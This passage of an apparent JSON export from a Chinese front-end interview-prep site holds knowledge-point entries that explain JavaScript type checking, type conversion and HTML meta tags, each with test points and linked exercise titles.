实现跨域请求，以及如何处理跨域相关的安全问题。\n  - 示例问题：如何通过 JavaScript 发起跨域请求？`crossorigin` 属性的作用是什么？\n\n- **Content Security Policy (CSP)**：如何通过 HTML 和 HTTP 头中的 CSP 限制页面加载的资源，防止 XSS 攻击。\n  - 示例问题：如何在 HTML 中使用 CSP 以防止脚本注入？\n\n### 10. **存储与交互**\n- **LocalStorage、SessionStorage 与 Cookies**：考察在页面中使用这些存储方式与后端进行数据交互的能力。\n  - 示例问题：LocalStorage 和 SessionStorage 有什么区别？如何通过 JavaScript 操作它们？",
    "exerciseKeyList": "[\"b4137265-8ebe-4fc8-be75-8dfaf125af6c\",\"2022f7f8-f3ec-4f8a-9971-9d5572d3e106\",\"2efd0e6a-c70c-4df5-965d-4e13b48fbd21\"]",
    "vipLimit": 0,
    "level": 1.5,
    "pointOrder": 19,
    "createAt": "2024-10-17T11:25:30.000Z",
    "updateAt": "2024-11-06T06:12:54.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "2022f7f8-f3ec-4f8a-9971-9d5572d3e106",
        "title": "给一个dom同时绑定两个点击事件，一个用捕获，一个用冒泡，说下会执行几次事件，然后会先执行冒泡还是捕获？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T14:15:12.000Z",
        "updateAt": "2022-04-10T12:04:13.000Z"
      },
      {
        "exerciseKey": "2efd0e6a-c70c-4df5-965d-4e13b48fbd21",
        "title": "HTTP 中如何处理表单数据的提交？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-06T13:24:47.000Z",
        "updateAt": "2024-08-10T17:06:08.000Z"
      },
      {
        "exerciseKey": "b4137265-8ebe-4fc8-be75-8dfaf125af6c",
        "title": "使用原生js给一个按钮绑定两个onclick事件",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T01:58:17.000Z",
        "updateAt": "2021-09-25T19:05:07.000Z"
      }
    ]
  },
  "144": {
    "id": 144,
    "tagId": 10,
    "title": "类型判断",
    "explanation": "JS中的类型判断也是咱的老朋友了，如果要你说两句，那便是啥玩意`typeof`、`instanceof`的，张口就来，但你真的掌握了每一种类型判断，并熟知其原理吗？就比如说`Object.prototype.toString.call()`，当面试官问其中的 `call`有什么作用时，咱们又该如何游说呢。\n\n## typeof原理\n\n所有的类型判断里当属`typeof`最为经典，其最为出名之处就是这玩意不顶用，`typeof`居然会将`null`判定为`object`，但这到底是什么原因？实际上，这就是JS这门编程语言的官方团队造出来的一个bug。\n\n```javascript\nlet s = '123'    \nlet n = 123     \nlet f = true      \nlet u = undefined  \nlet nu = null      \nlet sy = Symbol(123) \nlet big = 1234n  \nlet obj = {}\nlet arr = []\nlet fn = function(){}\nlet date = new Date();\n\nconsole.log(typeof(s));  // string\nconsole.log(typeof(n));  // number\nconsole.log(typeof(f))   // boolean\nconsole.log(typeof(u))   // undifined\nconsole.log(typeof(sy))  // symbol\nconsole.log(typeof(big)) // bigint\n\nconsole.log(typeof(nu));  //将null判断为object\n\n//以下为引用类型，除了function，一律被判断为object\nconsole.log(typeof(obj))  //object\nconsole.log(typeof(arr))  //object\nconsole.log(typeof(date)) //object\n\n// 所有引用类型只能判断function\nconsole.log(typeof(fn))   //function\n\n//\n```\n\n原因就是：`typeof`会把所有传进去的值都转成二进制，而当年JS制定的规则便是：原始类型的被转为二进制的前面三个值绝对不为零，而`typeof`会把前三位为零的类型全部认定为对象，`null`这个类型又是JS语言后来引入的。遵循其他语言的原则，JS语言将`null`的二进制值定为一长串的0，因此`typeof`在判断时会将其认定为`object`。\n\n因此，面试官一般不会询问判断方法 `typeof` 的原理。\n\n## 手写一个instanceof\n\n相较于`typeof`，`instanceof`有其优越之处，也有其不足之处，比如，`instanceof`只能判断引用类型，并且是通过原型链查找来判断类型。\n\n```javascript\nlet s = '123'    \nlet n = 123     \nlet f = true      \nlet u = undefined  \nlet nu = null      \nlet sy = Symbol(123) \nlet big = 1234n  \nlet obj = {}\nlet arr = []\nlet fn = function(){}\nlet date = new Date();\n\nconsole.log(s instanceof String);     // false instanceof 不能判断原始类型\n\n// 以下为引用类型\n\nconsole.log(obj instanceof Object) ;  // true\nconsole.log(arr instanceof Object);   // true\nconsole.log(fn instanceof Function);  // true\nconsole.log(date instanceof Date);    // true\n```\n\n首先要知道每个类型的原型都不相同。\n\n`instanceof`的原理具体来说就是`instanceof`会顺着原型链查找出其继承的原型，看这个原型到底是属于`String`、`Number`、`Boolean`等具体类型的哪一种，如果被判断的类型与我们期望的类型的原型相同，输出true，否则输出false。\n\n以下则为手写`myinstanceof`代码：\n\n```javascript\nfunction myinstanceof(L, R){\n    while(L !== null){\n        if(L.__proto__ === R.prototype){\n            return true;\n        }\n        L = L.__proto__\n    }\n    return false\n} \nconsole.log(myinstanceof([], Array))  // true\n```\n\n令人奇怪的是，为什么原型的判断中牵扯到`while`？熟知原型链的友友应该不难理解，正如之前所说，`instanceof` 是通过原型链查找来判断类型，那岂不知显示原型生隐式原型，如此往复，子子孙孙无穷尽也，正如下代码，如果用舍弃 `while` 转而用`if`进行进行判断，仅仅是三代原型的传递，就要用到三次`if`判断，可想而知原型链一长，代码都打不过来的光景。\n\n以下为不正确的`myinstanceof`手写代码：\n\n```javascript\nfunction B(){}\nlet b = new B();\n\nA.prototype = b;\nfunction A(){}\nlet a = new A();\n\nfunction myinstanceof(L,R){\n    if(L.__proto__ === R.prototype){\n        return true;\n    } else {\n        if(L.__proto__.__proto__ === R.prototype) {\n            return true\n        } else {\n            if(L.__proto__.__proto__.__proto__ === R.prototype)\n            return true\n        }\n    \n    }\n}\n\nconsole.log(myinstanceof(a, Object))    // true\n```\n\n## 最完美的判断方式：Object.prototype.toString.call()\n\n类型判断中最为完美的毋庸置疑，当属 `Object.prototype.toString.call()`，这是一种属于`object`原型上的方法。它能做到正确的判断出每一种类型。\n\n```javascript\nlet s = '123'    \nlet n = 123     \nlet f = true      \nlet u = undefined  \nlet nu = null      \nlet sy = Symbol(123) \nlet big = 1234n  \nlet obj = {}\nlet arr = []\nlet fn = function(){}\nlet date = new Date();\n\nconsole.log(Object.prototype.toString.call(s));   //  [object String]\nconsole.log(Object.prototype.toString.call(n));   //  [object Number]\nconsole.log(Object.prototype.toString.call(f));   //  [object Boolean]\nconsole.log(Object.prototype.toString.call(u));   //  [object Undefined]\nconsole.log(Object.prototype.toString.call(nu));  //  [object Null]\n\nconsole.log(Object.prototype.toString.call(obj));  // [object Object]\nconsole.log(Object.prototype.toString.call(arr));  // [object Array]\nconsole.log(Object.prototype.toString.call(fn));   // [object Function]\nconsole.log(Object.prototype.toString.call(date)); // [object Date]\n```\n\n这种判断方法的完整代码为 `Object.prototype.toString.call()`，关于它的原理，我们来看看官网是怎么对`Object.prototype.toString()` 进行解释的:\n\n![8948b1aab104d8597938de163aad085.png](https://static.ecool.fun//article/cb348e67-f121-407c-9567-2b502f2d83bf.jpeg)\n\n翻译成人话就是：\n\n1.  如果你传进来的值为`undefined`的话，直接返回一个\\[object Undefined\\]。\n    \n2.  如果你传进来的值为`null`的话，直接返回一个\\[object Null\\]。\n    \n3.  如果你既不是`undefined`又不是`null`的话，JS将调用`ToObject`方法，将`O`作为 `ToObject(this)`的执行结果。\n    \n\n`ToObject`的执行机理简单来说就是，传进来一个`boolean`类型会创建一个`boolean`包装类对象，传进来`Number`会创建一个`Number`字面量，传进来一个`String`会创建一个字符串字面量，传进来一个对象就会创建这个对象。总而言之，任何传进去的任何值都会转换为对象。\n\n4.  定义一个`class`作为内部属性`[[class]]`的值，用于承接传进来的值。\n    \n5.  返回由 `\"[\"` `object` 和 `class` 和 `\"]\"` 组成的字符串。\n    \n\n现在我们知道 `Object.prototype.toString()`的原理了，但是 `Object.prototype.toString.call()`后面加的这个`call`又有什么作用呢？让我们先试着输出一下:\n\n![1720141205510.png](https://static.ecool.fun//article/c91ee2dd-f362-4fbf-8062-523bf068ddf7.jpeg)\n\n可以看到令人啼笑皆非的一幕发生了，`Object.prototype.toString()`将 123 判断为`object`，而`Object.prototype.toString.call()`则输出了正确的判断，这又是什么原理？\n\n这正是`Object.prototype.toString()`执行过程中调用`ToObject()`的结果，上文提到，`ToObject()`会把你传进来的值都创建为相应的类型，123 传进来被创建为`String`，而字符串类型在V8眼里可不就是对象嘛。\n\n现在我们来说明 `call` 在此的作用，我们都知道`.call(obj)`的作用是将 `.call` 之前的函数中的 `this` 指向 obj，但也可以说是把 `.call` 之前的函数方法借给 obj 去使用，因此在`Object.prototype.toString.call()`中，`toString()`是这样被调用的：\n\n```vbscript\nObject.prototype.toString.call(obj)\n\nobj.toString()\n```\n\n就像上文对123的判断，当没有`call`时`toString`是在被123实例对象调用，而当添加上`call` 后，`toString`就变成是被123的原型所调用。因此，`call`确保了类型判断是被原型在调用，从而能输出正确的值。\n\n## Array.isArray()\n\n最后一个要讲的就是`Array.isArray()`，这是一个隶属于 `Array` 构造函数的静态方法，遗憾的是，它只能判断数组。\n\n```javascript\nlet arr = []\nlet s = '123' \n\n\nconsole.log(Array.isArray(arr));  // true\nconsole.log(Array.isArray(s));    // false\n```\n\n## 总结：\n\n**typeof**\n\n-   可以判断除 `null` 之外的所有原始类型。\n-   除了`function`其他所有的引用类型都会被判断成object。\n-   `typeof`是通过将值转换为二进制后判断其二进制前三位是否为0，是则为`object`。\n\n**instanceof**\n\n-   只能判断引用类型。\n-   通过原型链查找来判断类型。\n\n**Object.prototype.toString()**\n\n-   一种Object原型上的方法。\n\n**Array.isArray()**\n\n-   一个隶属于 `Array` 构造函数的静态方法。\n\n以上便是 **typeof**、**instanceof**、**Object.prototype.toString.call()**、**Array.isArray()** 这四种类型判断。虽然我说其中`Object.prototype.toString()`的判断最为完美全面，但在实际应用之中它们各有优劣之处，应用场景也各有不同。",
    "testPoint": "### 1. **基本数据类型与引用数据类型**\n   - **理解基本数据类型**：如 `undefined`、`null`、`boolean`、`number`、`string` 和 `symbol`（ES6），以及引用类型（如 `Object`、`Array`、`Function` 等）。\n   - **类型的特点**：基本数据类型是不可变的，而引用数据类型是可变的。\n\n### 2. **typeof 操作符**\n   - **用法**：了解如何使用 `typeof` 判断数据类型，以及它返回的不同字符串值。\n   ```javascript\n   console.log(typeof 42); // \"number\"\n   console.log(typeof 'hello'); // \"string\"\n   console.log(typeof true); // \"boolean\"\n   console.log(typeof null); // \"object\"（这是一个历史遗留问题）\n   console.log(typeof undefined); // \"undefined\"\n   console.log(typeof {}); // \"object\"\n   console.log(typeof []); // \"object\"\n   console.log(typeof function(){}); // \"function\"\n   ```\n   - **注意事项**：`typeof` 对于一些特殊类型（如 `null` 和数组）返回的结果可能不符合直觉。\n\n### 3. **instanceof 操作符**\n   - **用法**：用于判断一个对象是否是某个构造函数的实例。\n   ```javascript\n   console.log([] instanceof Array); // true\n   console.log({} instanceof Object); // true\n   console.log(function(){} instanceof Function); // true\n   ```\n   - **原型链**：了解 `instanceof` 是通过检查原型链来判断的。\n\n### 4. **Object.prototype.toString 方法**\n   - **用法**：可以更准确地判断数据类型，尤其是引用类型。\n   ```javascript\n   console.log(Object.prototype.toString.call([])); // \"[object Array]\"\n   console.log(Object.prototype.toString.call({})); // \"[object Object]\"\n   console.log(Object.prototype.toString.call(new Date())); // \"[object Date]\"\n   ```\n   - **用途**：通常用于处理较复杂的类型判断。\n\n### 5. **自定义类型判断**\n   - **封装类型判断函数**：如何封装自定义函数来判断特定的数据类型。\n   ```javascript\n   function isArray(value) {\n       return Object.prototype.toString.call(value) === '[object Array]';\n   }\n   ```\n\n### 6. **类型转换**\n   - **隐式转换**：JavaScript 在某些操作中会自动进行类型转换，考察点包括如何理解这些隐式转换（例如，在比较时）。\n   - **显式转换**：如何使用 `String()`、`Number()`、`Boolean()` 等函数进行显式类型转换。\n\n### 7. **null 和 undefined 的区别**\n   - **判断**：了解如何判断一个变量是 `null` 还是 `undefined`，以及它们的使用场景。\n   ```javascript\n   console.log(value === null); // true\n   console.log(value === undefined); // true\n   ```\n\n### 8. **安全类型判断**\n   - **防止错误**：在进行类型判断时，如何处理一些边界情况（如类型不一致、空值等）。\n\n### 9. **类型安全与 TypeScript**\n   - **TypeScript 中的类型判断**：在 TypeScript 中，如何使用类型系统进行更安全的类型判断和约束。",
    "exerciseKeyList": "[\"1d87535d-c1c8-4c6e-b6f5-583c80193217\",\"a24f7d09-79df-4468-af94-654e8cfd3288\",\"74d6fe86-2acf-4b0c-a588-0738302ced01\",\"f53e39b7-9de1-4a49-b95d-6c73591d5512\",\"e1584502-c0d4-416f-abe4-cc0a01c6002d\",\"2e0cedc6-3c76-438a-8677-27b8ea9c0e61\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-11-04T14:23:27.000Z",
    "updateAt": "2024-11-14T09:14:20.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1d87535d-c1c8-4c6e-b6f5-583c80193217",
        "title": "instanceof能否判断基本数据类型？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T16:00:48.000Z",
        "updateAt": "2021-07-07T00:14:28.000Z"
      },
      {
        "exerciseKey": "2e0cedc6-3c76-438a-8677-27b8ea9c0e61",
        "title": "使用TS实现一个判断传入参数是否是数组类型的方法",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-12-30T01:31:53.000Z",
        "updateAt": "2023-03-12T22:38:45.000Z"
      },
      {
        "exerciseKey": "74d6fe86-2acf-4b0c-a588-0738302ced01",
        "title": "数据类型检测的方式有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-22T10:15:07.000Z",
        "updateAt": "2025-08-21T15:21:38.000Z"
      },
      {
        "exerciseKey": "a24f7d09-79df-4468-af94-654e8cfd3288",
        "title": "typeof 是否能正确判断类型？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T16:00:14.000Z",
        "updateAt": "2024-08-10T17:05:14.000Z"
      },
      {
        "exerciseKey": "e1584502-c0d4-416f-abe4-cc0a01c6002d",
        "title": "封装一个 javascript 的类型判断函数",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:42:27.000Z",
        "updateAt": "2021-11-17T22:50:59.000Z"
      },
      {
        "exerciseKey": "f53e39b7-9de1-4a49-b95d-6c73591d5512",
        "title": "js中如何判断一个值是否是数组类型？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T03:04:29.000Z",
        "updateAt": "2024-07-20T11:47:43.000Z"
      }
    ]
  },
  "145": {
    "id": 145,
    "tagId": 10,
    "title": "数据类型转换",
    "explanation": "# 前言\n\nJavaScript 是一种非常灵活的编程语言，它允许开发者在代码中进行各种类型的操作和转换。其中，显式和隐式类型转换是 JavaScript 中一个重要而又常见的概念。你是否曾经遇到过 JavaScript 中奇怪的类型转换行为？当你使用加号连接两个不同类型的值时，为什么有时候会得到意料之外的结果？为了更好地理解 JavaScript 中的这些行为，我本篇文章将带大家深入探讨显式和隐式类型转换。\n\n# 数据类型\n\n首先简单了解下有哪些数据类型。\n\n> 原始数据类型：String、Number、Boolean、Symbol、Undefined、Null、BigInt（本文不讨论BigInt、Symbol）\n> \n> 引用数据类型: Object（引用类型指向一个对象，不是原始值，指向对象的变量是引用变量）\n\n# 类型转换\n\n数据类型之间的转换可以分为下面三种：\n\n1.  原始数据类型之间的转换。\n2.  原始数据类型转换为对象。\n3.  对象转换为原始数据类型。\n\n## 1.1 原始数据类型转Number\n\n```javascript\nconsole.log(Number('123')); // 123\nconsole.log(Number(true)); // 1\nconsole.log(Number(undefined)); // NaN\nconsole.log(Number(null)); // 0\n```\n\n我们可以直接调用`Number()`函数来进行转换。该函数会把`undefined`转换为`NaN`，将`null`转换为`0`。\n\n而对于字符串，如果字符串中仅仅包含数字，则将转换为数字，若包含非数字字符，则返回`NaN`。我们也可以使用`parseInt()`来转换字符串。\n\n```javascript\nconsole.log(parseInt('123')); // 123\nconsole.log(parseInt('12.3')); // 12\nconsole.log(parseInt('12ds8'));// 12\nconsole.log(parseInt('ads25')); // NaN\n```\n\n`parseInt()`只解析整数部分，忽略小数部分。`parseFloat()`可以将字符串转换为浮点数的函数。\n\n## 1.2 原始数据类型转String\n\n```javascript\nconsole.log(String());//''\nconsole.log(String(123));//'123'\nconsole.log(String(NaN));//NaN\nconsole.log(String(undefined));//undefined\nconsole.log(String(null));//null\nconsole.log(String(true));//true\n```\n\n我们可以使用`String()` 构造函数将任何类型的数据转换为字符串类型。它将接收到的参数转换为对应的字符串表示形式。\n\n## 1.3 原始数据类型转Boolean\n\n```javascript\nconsole.log(Boolean());// false\nconsole.log(Boolean('Ywis'));// tru\nconsole.log(Boolean(123));// true\nconsole.log(Boolean(NaN));// false\nconsole.log(Boolean(undefined));// false\nconsole.log(Boolean(null));// false\nconsole.log(Boolean(true));// true\n```\n\n调用`Boolean()`函数进行转换。在将非布尔值类型转换为布尔值类型时，有一个总结：\n\n1.  `false`：布尔值 false\n2.  `undefined`：未定义的值\n3.  `null`：空值\n4.  `0`：数字 0\n5.  `-0`：负零\n6.  `NaN`：非数字值\n7.  `''`：空字符串\n\n除了以上七个值外，其他值（包括对象、数组、函数等）在转换为布尔值时都会返回 `true`。这种规则使得 JS 中的大多数值被视为真值（truthy）。\n\n## 2\\. 原始数据类型转换为对象\n\n```javascript\nconsole.log(Object());//{}\nconsole.log(Object('Ywis'));//[String: 'Ywis']\nconsole.log(Object(123));//[Number: 123]\nconsole.log(Object(true));//[Boolean: true]\nconsole.log(Object(undefined));//{}\nconsole.log(Object(null));//{}\n```\n\n一样直接使用`Object()`构造函数，其中除了将`undefined`和`null`转换为空对象，其他都会转换为对象。同样我们可以使用对象的包装器（Object Wrappers）将原始数据类型转换为对象类型。\n\n```javascript\nlet str = 'Ywis'\nlet x = new String (str)\nconsole.log(x); //[String: 'Ywis']\n```\n\n需要注意的是：\n\n-   使用对象包装器将原始数据类型转换为对象类型时，创建的是一个新的对象，而不是对原始值的引用。\n-   尽管可以将原始数据类型转换为对象类型，但并不推荐这样做，因为会增加额外的内存开销。\n\n## 3.1 对象转换为原始数据类型（ToPrimitive 底层原理来了，敲黑板🔥🔥）\n\n在 JavaScript 中，`ToPrimitive` 是一个抽象操作，用于将值转换为原始数据类型。它是在一些内部操作中使用的概念，例如在进行算术运算、比较操作、或将对象转换为原始值时。\n\n`ToPrimitive` 操作涉及到以下步骤：\n\n1.  如果值已经是原始数据类型，则直接返回该值。\n2.  否则，调用对象的 `valueOf()` 方法。如果返回的是原始数据类型，则将其作为结果返回。\n3.  否则，调用对象的 `toString()` 方法。如果返回的是原始数据类型，则将其作为结果返回。\n4.  如果上述步骤都无法得到原始数据类型的值，则抛出类型错误（TypeError）。\n\n这是官方文档对于`ToPrimitive`的介绍([es5.github.io/#x9.1](https://es5.github.io/#x9.1 \"https://es5.github.io/#x9.1\"))\n\n## 3.2 valueOf\n\n`valueOf()` 是 JavaScript 对象的一个方法，如果对象具有原始数据类型的值，则直接返回该值；否则返回对象本身。\n\n-   基本包装类型直接返回原始值\n-   Date 类型返回毫秒数\n-   其他都返回对象本身\n\n```javascript\n// 1. 基本包装类\nlet num = new Number('123')\nconsole.log(num.valueOf()); // 123\n\nlet str = 'Ywis'\nconsole.log(str.valueOf()); // Ywis\n\n// 2. Date 类型返回一个内部表示：1970年1月1日以来的毫秒数\nlet date = new Date();\nconsole.log(date.valueOf()); // 1710155613356\n\n// 3.返回对象本身\nlet obj = new Array()\nconsole.log(obj.valueOf()); // []\n```\n\n## toString\n\n`toString()` 方法是 JavaScript 中所有对象继承自 `Object.prototype` 的方法，用于返回对象的字符串表示形式。\n\n-   基本包装类型直接返回原始值\n-   很多类都有实现各自版本的 toString()，例如日期、数组、函数。\n    -   对象调用:{}.toSring 返回由\"\\[Object\" 和 类型名 和\"\\]\"组成的字符串\n    -   数组调用:\\[\\].toString 返回由数组内部元素以逗号拼接的字符串\n    -   Date类型转换为可读的日期和时间字符串\n    -   函数调用：返回这个函数定义的 JS 源代码字符串\n\n```javascript\n// 1. 基本包装类\nlet num = new Number('123abc')\nconsole.log(num.toString()); // NaN\n\nlet str = 'Ywis'\nconsole.log(str.toString()); // Ywis\n\n// 2.1 对象调用\nlet obj = new Object({});\nconsole.log(obj.toString()); // [object Object]\n\n// 2.2 数组调用\nlet arr = new Array(1, 2, 3);\nconsole.log(arr.toString()); // 1,2,3\n\n// 2.3  Date类型转换为可读的日期和时间字符串\nlet date = new Date();\nconsole.log(date.toString()); // Mon Mar 11 2024 19:30:58 GMT+0800 (中国标准时间)\n\n// 2.4 函数调用\nlet fun = function(){console.log('Ywis');}\nconsole.log(fun.toString()); // function(){console.log('Ywis');}\n```\n\n# 类型转换表（来自《JavaScript权威指南》）\n\n![image.png](https://static.ecool.fun//article/50a263f5-cfb5-424d-9039-410d318343b7.jpeg)\n\n# 显式转换\n\n显式转换（Explicit Conversion）是指在代码中明确地使用转换函数或操作符来将一个数据类型转换为另一个数据类型。这种转换是人为明确指定的，以确保代码的行为符合预期，比如下面场景：\n\n```javascript\nconsole.log(Boolean('Ywis')); // true\nconsole.log(parseInt('10')); // 10\n\nconsole.log(new Number('10')); // [Number: 10]\n```\n\n1.  **转换函数**：JS 提供了一些内置的转换函数，如 `parseInt()`, `parseFloat()`, `String()`, `Number()`, `Boolean()` 等\n2.  **构造函数**：某些数据类型具有对应的构造函数，可以用于显式地创建该数据类型的实例。\n\n# 隐式转换\n\n隐式转换（Implicit Conversion）是指在 JS 中，在某些运算或操作中，当涉及到不同类型的数据时，JavaScript 引擎会自动进行类型转换，以便完成该运算或操作。这种转换是由 JavaScript 引擎隐式地执行的，而不需要人们明确指定。\n\n**常见的隐式转换**：\n\n-   逻辑表达式：逻辑运算符（如逻辑非 `！`逻辑与 `&&`、逻辑或 `||`）中，非布尔类型的值会被隐式转换为布尔类型。\n\n```sql\nconsole.log(![]); //false \n//[]先被转换成boolean，值为true，再取反为false。\n```\n\n-   逻辑语句的类型转换：当使用if、while、for 时，隐式转换为布尔值；\n\n```lua\nif ('Ywis') {\n    console.log(\"Ywis is truthy\"); // \"Ywis is truthy\"，Ywis 被隐式转换为 true\n}\n```\n\n-   算术表达式：当使用算术运算符（如加号 `+`、减号 `-`、乘号 `*` 等）进行运算时，如果操作数的类型不同，JavaScript 会尝试将它们转换为相同的类型，然后进行运算。\n\n```javascript\nlet str1 = 'Ywis'\nlet str2 = '123'\nconsole.log(str1 + '666'); // Ywis666\nconsole.log(+str2); // 123\n```\n\n-   比较操作：当使用比较运算符（如等号 `==`、不等号 `!=`、大于号 `>` 等）进行比较时。\n\n```lua\nconsole.log(\"10\" == 10); // true，字符串 \"10\" 隐式转换为数字 10，然后比较\n```\n",
    "testPoint": "### 1. **隐式类型转换**\n   - **自动转换**：JavaScript 在某些操作中会自动进行类型转换。例如，在运算、比较或逻辑运算中，常常会发生隐式转换。\n   - **示例**：\n     ```javascript\n     console.log(1 + '2'); // \"12\"（数字转换为字符串）\n     console.log(1 - '2'); // -1（字符串转换为数字）\n     console.log(true + 1); // 2（布尔值转换为数字）\n     ```\n\n### 2. **显式类型转换**\n   - **使用构造函数**：可以使用内置构造函数显式地转换数据类型。\n   - **示例**：\n     - **String 转换**：`String(value)`\n       ```javascript\n       console.log(String(123)); // \"123\"\n       ```\n     - **Number 转换**：`Number(value)`\n       ```javascript\n       console.log(Number('123')); // 123\n       console.log(Number('')); // 0\n       console.log(Number(null)); // 0\n       console.log(Number(undefined)); // NaN\n       ```\n     - **Boolean 转换**：`Boolean(value)`\n       ```javascript\n       console.log(Boolean(0)); // false\n       console.log(Boolean(1)); // true\n       console.log(Boolean('')); // false\n       ```\n\n### 3. **特殊情况**\n   - **NaN 的处理**：了解 `NaN` 是如何产生的，如何判断一个值是否为 `NaN`（使用 `Number.isNaN()`）。\n   - **字符串与数字的转换**：当一个字符串被转换为数字时，如果字符串不能被解析为有效数字，结果将是 `NaN`。\n     ```javascript\n     console.log(Number('abc')); // NaN\n     ```\n\n### 4. **数组和对象的转换**\n   - **数组转字符串**：数组在隐式转换为字符串时，元素会被逗号分隔。\n     ```javascript\n     console.log([1, 2, 3]); // \"1,2,3\"\n     ```\n   - **对象转字符串**：对象在隐式转换时会调用 `toString()` 方法，通常返回 `[object Object]`，需要使用 `JSON.stringify()` 来获取对象的 JSON 表示。\n     ```javascript\n     console.log({ a: 1 }); // \"[object Object]\"\n     console.log(JSON.stringify({ a: 1 })); // \"{\"a\":1}\"\n     ```\n\n### 5. **使用 `parseInt` 和 `parseFloat`**\n   - **解析字符串**：`parseInt` 和 `parseFloat` 用于将字符串解析为整数或浮点数。\n   - **示例**：\n     ```javascript\n     console.log(parseInt('123')); // 123\n     console.log(parseFloat('123.45')); // 123.45\n     console.log(parseInt('abc')); // NaN\n     ```\n\n### 6. **基础类型与引用类型的转换**\n   - **基本类型**：基本类型在赋值时是值传递。\n   - **引用类型**：引用类型在赋值时是引用传递，改变引用类型的内容会影响原始对象。\n\n### 7. **对象与基本类型之间的转换**\n   - **对象包装类型**：当访问基本数据类型的方法时，JavaScript 会自动将其转换为对应的对象类型（如 `String`、`Number`、`Boolean`）。\n   - **示例**：\n     ```javascript\n     let str = 'hello';\n     console.log(str.toUpperCase()); // \"HELLO\"（隐式转换为 String 对象）\n     ```\n\n### 8. **安全的转换方法**\n   - **防止类型错误**：如何在转换时处理可能出现的错误或异常，确保代码的健壮性。\n   - **使用 `try...catch`**：在进行复杂的转换操作时，使用错误捕获来处理潜在的异常。\n\n### 9. **性能考虑**\n   - **转换方法的选择**：了解不同转换方法的性能差异，在需要高效处理大量数据时进行合理选择。\n\n### 10. **TypeScript 的类型安全**\n   - **类型注解**：在 TypeScript 中如何使用类型注解和类型推断，确保数据类型的正确性和转换的安全性。",
    "exerciseKeyList": "[\"5eb78861-d964-4825-8531-316eca1df596\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 2,
    "createAt": "2024-11-04T14:33:49.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "5eb78861-d964-4825-8531-316eca1df596",
        "title": "谈谈 Javascript 中的类型转换机制",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:47:34.000Z",
        "updateAt": "2024-08-10T19:49:01.000Z"
      }
    ]
  },
  "146": {
    "id": 146,
    "tagId": 12,
    "title": "meta 标签",
    "explanation": "## 概览\n\nmeta标签一般放在整个`html`页面的`head`部分，在`MDN`中对他这样定义：\n\n> meta是**文档级元数据元素**，用来表示那些不能由其它 HTML 元相关元素（`<base>`、`<link>`, `<script>`、`<style>`或 `<title>`）之一表示的任何元数据。\n\n是不是感觉看起来很抽象？说白了就是为了传达信息。\n\n先看看`meta` 元素定义的元数据的类型：\n\n-   如果设置了 `name`属性，`meta` 元素提供的是文档级别的元数据，应用于整个页面。\n-   如果设置了 `http-equiv`属性，`meta` 元素则是编译指令，提供的信息与类似命名的 HTTP 头部相同。\n-   如果设置了 `charset`属性，`meta` 元素是一个字符集声明，告诉文档使用哪种字符编码。\n-   如果设置了 `itemprop` 属性，`meta` 元素提供用户定义的元数据。\n\n## name属性\n\n`name`和`content`一起使用，前者表示要表示的元数据的`名称`，后者是元数据的`值`。\n\n### author\n\n用来表示网页的作者的名字，例如某个组织或者机构。\n\n```html\n<meta name=\"author\" content=\"aaa@mail.abc.com\">\n```\n\n### description\n\n是一段简短而精确的、对页面内容的描述。以头条和taobao的`description`标签为例：\n\n![](https://static.ecool.fun//article/55bf51d1-579c-47b5-be74-9e169c9fb7aa.jpeg)  \n  \n![](https://static.ecool.fun//article/abcf6c1f-7655-4631-be6d-cf89fd81e4fc.jpeg)\n\n### keywords\n\n与页面内容相关的关键词，使用逗号分隔。某些搜索引擎在遇到这些关键字时，会用这些关键字对文档进行分类。 还是以头条和taobao为例\n\n![](https://static.ecool.fun//article/f0c727f5-1e82-416c-8c94-fd97f4b634e0.jpeg)  \n  \n![](https://static.ecool.fun//article/ea10969d-2c95-45b7-aab8-6fbdb9386861.jpeg)\n\n### viewpoint\n\n为 viewport（视口）的初始大小提供指示。目前仅用于移动设备。\n\n可能你也发现了，我们在`vscode`中自动生成`html`的代码片段时，会自动生成：\n\n```html\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n```\n\n`width`用来设置 viewport 的宽度为设备宽度;\n\n`initial-scale`为设备宽度与 viewport 大小之间的缩放比例。\n\n![](https://static.ecool.fun//article/0f573aeb-d9cc-4d44-9d97-14833e12f95f.jpeg)\n\n### robots\n\n表示爬虫对此页面的处理行为，或者说，应当遵守的规则，是用来做搜索引擎抓取的。\n\n它的`content`可以为：\n\n1.  `all`:搜索引擎将索引此网页，并继续通过此网页的链接索引文件将被检索\n2.  `none`:搜索引擎讲忽略此网页\n3.  `index`:搜索引擎索引此网页\n4.  `follow`:搜索引擎继续通过此网页的链接索引搜索其它的网页\n\n### renderer\n\n用来指定双核浏览器的渲染方式，比如360浏览器，我们可以通过这个设置来指定360浏览器的渲染方式\n\n```html\n<meta name=\"renderer\" content=\"webkit\"> //默认webkit内核\n<meta name=\"renderer\" content=\"ie-comp\"> //默认IE兼容模式\n<meta name=\"renderer\" content=\"ie-stand\"> //默认IE标准模式\n```\n\n## http-equiv\n\n`http-equiv`也是和`content`一起使用，前者表示要表示的元数据的`名称`，后者是元数据的`值`。\n\n`http-equiv` 所有允许的值都是特定 HTTP 头部的名称，\n\n### 